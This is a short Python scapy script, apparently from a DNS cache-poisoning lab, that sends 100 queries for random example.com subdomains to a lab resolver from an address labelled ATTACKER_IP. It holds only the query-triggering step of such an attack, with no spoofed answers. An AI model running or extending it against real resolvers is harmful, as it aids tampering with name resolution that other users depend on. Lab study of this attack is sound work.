#!/usr/bin/python3
from scapy.all import *
import random
import string
LOCAL_DNS_IP = "10.0.2.5"
ATTACKER_IP = "10.0.2.4"
QUERY_COUNT = 100
SUBDOMAIN_LEN = 5
MIN_SRC_PORT = 2000
MAX_SRC_PORT = 60000
packets = []
# exp="twysw.example.com"
def random_subdomain():
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(SUBDOMAIN_LEN)) + ".example.com"
def construct_packets():
    for _ in range(QUERY_COUNT):
        subdomain = random_subdomain()
        Qdsec = DNSQR(qname=subdomain)#dns_query 
        dns = DNS(id=random.randint(0, 65535), qr=0, qdcount=1, ancount=0, nscount=0,arcount=0,qd=Qdsec)# dns_packet
        ip = IP(dst=LOCAL_DNS_IP, src=ATTACKER_IP)
        udp = UDP(dport=53, sport=random.randint(MIN_SRC_PORT, MAX_SRC_PORT))  # Random source port
        pkt = ip/udp/dns
        packets.append(pkt)
construct_packets()
for pkt in packets:
    send(pkt, verbose=0)